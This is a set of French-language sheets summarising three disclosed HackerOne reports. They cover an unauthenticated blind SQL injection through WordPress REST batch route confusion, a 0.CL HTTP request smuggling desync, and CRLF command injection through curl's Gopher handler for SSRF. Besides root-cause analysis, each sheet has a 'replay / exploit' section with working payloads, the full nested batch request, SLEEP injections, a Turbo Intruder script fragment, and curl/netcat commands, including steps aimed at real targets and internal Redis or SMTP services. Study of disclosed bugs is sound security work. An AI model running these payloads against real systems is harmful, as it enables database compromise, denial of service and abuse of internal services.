# Fiches SSS — HTTP Request Smuggling

*3 cas réels 2025-2026 (HackerOne) : cause racine, preuves verbatim et plan de reproduction dérivés de la source uniquement.*

---

### Unauthenticated SQL Injection via REST Batch Route Confusion ████████

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3873072)

L'endpoint batch de l'API REST WordPress (`/wp-json/batch/v1`) d'une cible 7.0 est vulnérable à une blind SQL injection non authentifiée. En imbriquant un batch dans le corps d'un `POST /wp/v2/categories`, un chemin invalide (fail de `parse_url()`) provoque une désynchronisation de l'index de dispatch : la sous-requête N s'exécute avec le handler de N+1, et `GET /wp/v2/categories?author_exclude=<payload>` atteint la base comme requête de posts, où la string échappe au cast `absint()`. Confirmé par timing : `SLEEP(0.01)` → 9,12 s contre 0,49 s pour `SLEEP(0)` (~860 lignes), aucun cookie/token requis.

**Cause racine :** deux défauts en chaîne — (1) l'échec de `parse_url()` d'une sous-requête ne pousse pas de résultat dans `$matches` mais la boucle de dispatch incrémente quand même son index (route confusion N → N+1) ; (2) `WP_Query` vérifie `if (! empty($q['author__not_in']))` sans vérifier le type tableau, donc une string est concaténée dans `AND wp_posts.post_author NOT IN ( <attacker-controlled> )`.

**Preuve technique (verbatim depuis la source) :**

```
{"validation":"normal","requests":[
  {"path":":","method":"POST"},
  {"path":"/wp/v2/categories","method":"POST","body":{
    "name":"x","requests":[
      {"path":":","method":"GET"},
      {"path":"/wp/v2/categories?author_exclude=1","method":"GET"},
      {"path":"/wp/v2/posts","method":"GET"}
    ]}},
  {"path":"/batch/v1","method":"POST"}
]}

[0] status=400  code=parse_path_failed         ← invalid path ":" triggers desync
[1] status=207  → NESTED BATCH ENVELOPE        ← route confusion confirmed

| `1) OR SLEEP(0.01)-- -` | **9.12 s** | 207 | ~860 rows × 0.01s |
…
| `1) OR SLEEP(3)-- -` | **>60 s** | timeout | ~860 rows × 3s |
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte/cookie/token ; cible WordPress 7.0 (ou versions affectées), backend MySQL ; injection point `author_exclude=1) OR SLEEP(N)-- -`.
- Étapes : 1. Fingerprint : `GET /feed/` contient `<generator>https://wordpress.org/?v=7.0</generator>`. 2. Poster le corps batch ci-dessus (non destructif) → réponse HTTP 207 avec enveloppe batch imbriquée et marqueurs `parse_path_failed` (un serveur patché renvoie une enveloppe plate `rest_cannot_create`). 3. Remplacer `author_exclude=1` par `1) OR SLEEP(0.01)-- -` dans la sous-requête imbriquée et mesurer : ~9,12 s contre ~0,5 s en baseline (multiplication ~860 lignes = injection dans l'évaluation WP_Query).
- Pièges / limites : payloads `SLEEP(0.3)`/`SLEEP(3)` provoquent des timeouts >30/60 s ; serveur patché = enveloppe plate sans désync ; atténuation interim : bloquer les POST non authentifiés vers `/wp-json/batch/v1` et `/?rest_route=/batch/v1` ; pas d'extraction de données effectuée (test non destructif).

**Reproductibilité :** haute — requêtes complètes, prérequis nuls (non authentifié), comportements attendus vulnérable/patché explicités.

**Techniques :** wordpress rest batch desync, route dispatch confusion, blind sqli, time-based sqli, parse_url failure

**Correspond aux classes qualifiantes :** sqli (unauth), dos (timeouts), access control bypass (dispatch)

**Signal (endpoints/fonctions observés) :**
- `POST /wp-json/batch/v1` (corps `requests` imbriqué, chemin `:`)
- `GET /wp/v2/categories?author_exclude=` réinterprété en requête posts
- sink SQL `AND wp_posts.post_author NOT IN ( … )` ; fingerprint `/feed/`

**Paramètres impliqués :** `author_exclude`, `author__not_in`, `requests`, `validation`, `path`, `method`

---

### HTTP Request Smuggling

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3589269)

Desync `0.CL` sur la cible Essity : le frontend ignore un en-tête `Content-Length` malformé que le backend traite, permettant de contrôler les frontières de requêtes sur des connexions keep-alive. Le script Turbo Intruder fourni réalise un double desync : stage1 avec `Content-length:` suivi d'une valeur malformée (le `%s` remplacé par `len(stage2_chopped)`), puis stage2 + victime. Le préfixe `smuggled` (`TRACE /assets`) se retrouve collé devant la requête de la victime simulée, dont le `GET /` vers la page d'accueil produit par intermittence un 405 au lieu du 200 normal. Impact seul : DoS (trafic utilisateur cassé) ; chaînable selon la source vers response queue poisoning, XSS global, cache poisoning, open redirect et contournement de contrôles d'accès.

**Cause racine :** incohérence de parsing HTTP/1.1 entre frontend et backend sur un `Content-Length` malformé (0.CL) — le desync prend le contrôle de la frontière de requête suivante sur la même connexion keep-alive.

**Preuve technique (verbatim depuis la source) :**

```
        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        engine.queue(victim, label='victim')

    smuggled = '''TRACE /assets HTTP/1.1
X: x'''

TRACE /assets HTTP/1.1
X: xGET / HTTP/1.1

Note that their request towards the home page, occasionally produces a 405 response, instead of the normal 200 response.
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : Burp Suite + extension Turbo Intruder ; une requête valide vers la cible (host masqué ████ dans le rapport) ; la cible doit présenter le desync 0.CL entre son proxy et son backend.
- Étapes : 1. Envoyer une requête valide vers la cible puis l'envoyer vers Turbo Intruder. 2. Coller le script fourni (stage1 avec `Content-length:` + `%s` ; `smuggled = '''TRACE /assets HTTP/1.1\nX: x'''` ; stage2_chopped/stage2_revealed ; puis « Attack »). 3. Observer le tableau de résultats : la victime simulée reçoit parfois 405 au lieu de 200 — preuve que le préfixe smugglé s'est collé devant sa requête (`X: xGET / HTTP/1.1`).
- Pièges / limites : les attaques 0.CL « use a double desync so they can take a while » (script : stage1 peut prendre du temps) ; le script exige que stage1 finisse par une ligne vide sans corps ; si le serveur n'accepte pas GET avec corps, essayer OPTIONS ; host et cookie masqués dans le rapport.

**Reproductibilité :** moyenne — script complet fourni, mais dépend d'une pile proxy/backend vulnérable au 0.CL et d'un timing de desync.

**Techniques :** http request smuggling, 0.cl desync, content-length obfuscation, keep-alive connection reuse, turbo intruder, double desync

**Correspond aux classes qualifiantes :** http request smuggling, dos, cache poisoning (potentiel), access control bypass (potentiel)

**Signal (endpoints/fonctions observés) :**
- stage1 `POST /CON` avec `Content-length:` + valeur `%s` et ligne vide (fixContentLength=False)
- préfixe smugglé `TRACE /assets HTTP/1.1` suivi de `X: x` collé à la requête suivante
- victime `GET /` → 405 intermittent au lieu de 200

**Paramètres impliqués :** `Content-Length`, `Connection: keep-alive`, préfixe smuggled, `stage2_chopped`, `stage2_revealed`

---

### Gopher Protocol Command Injection (SSRF Smuggling)

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3508785)

Le handler Gopher de curl est vulnérable à une injection de commandes via des séquences CRLF URL-encodées dans le chemin. `lib/gopher.c:101` décode le sélecteur avec `Curl_urldecode(..., REJECT_ZERO)` : seul `%00` est bloqué, donc `%0d%0a` traverse et curl envoie plusieurs lignes distinctes au serveur, ligne par ligne. Un PoC avec listener netcat démontre l'envoi de deux commandes (`first-command`, `second-command`) depuis une seule URL. Impact SSRF renforcé : envoi de commandes à des services internes line-delimited (Redis, SMTP, memcached), contournement de WAF qui n'inspectent que le chemin d'URL et des systèmes de log qui n'enregistrent que la première requête.

**Cause racine :** le drapeau `REJECT_ZERO` du décodage d'URL ne rejette que les null bytes ; les caractères de contrôle CR/LF (`%0d%0a`) sont décodés dans le buffer puis envoyés dans un protocole line-delimited, injectant des lignes supplémentaires.

**Preuve technique (verbatim depuis la source) :**

```
/* lib/gopher.c:101 */
result = Curl_urldecode(newp, 0, &buf_alloc, &buf_len, REJECT_ZERO);

curl -v "gopher://localhost:7070/1/first-command%0d%0asecond-command"

gopher://internal-redis:6379/1/SET%20key%20value%0d%0aGET%20sensitive_data

'legitimate\r\ninjected\r\nmalicious\r\n'
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : application qui fait chercher des URL fournies par l'utilisateur par curl (surface SSRF) ; service interne line-delimited joignable (Redis 6379, SMTP 25, memcached) ; curl vulnérable.
- Étapes : 1. `nc -l -p 7070`. 2. `curl -v "gopher://localhost:7070/1/first-command%0d%0asecond-command"`. 3. Constater deux lignes distinctes reçues par le listener (preuve d'injection). 4. Contre une cible réelle : `gopher://internal-redis:6379/1/SET%20key%20value%0d%0aGET%20sensitive_data` (scénario Redis) ou le scénario SMTP `MAIL FROM… / RCPT TO… / DATA…`.
- Pièges / limites : `REJECT_ZERO` bloque uniquement `%00` ; le fix recommandé (`REJECT_CTRL`) fait échouer le PoC avec une erreur « control characters are not allowed in the URL » ; le rapport ne documente pas l'exploitation d'une cible SSRF réelle (PoC local + scénarios).

**Reproductibilité :** haute — PoC local en une commande (netcat + curl), prérequis triviaux, sortie attendue fournie.

**Techniques :** gopher protocol smuggling, crlf injection in url, ssrf enhancement, redis command injection, smtp relay abuse, waf bypass via encoded control chars

**Correspond aux classes qualifiantes :** ssrf, crlf injection, command injection (protocol smuggling)

**Signal (endpoints/fonctions observés) :**
- `gopher://host/1/<selector>%0d%0a<injected>` (CRLF encodé dans le chemin)
- `lib/gopher.c` `gopher_do` ligne 101 (`Curl_urldecode` avec `REJECT_ZERO`)
- services internes ciblables : Redis 6379, SMTP 25, memcached

**Paramètres impliqués :** sélecteur Gopher URL-encodé (`%0d%0a`), drapeau `REJECT_ZERO` / `REJECT_CTRL`
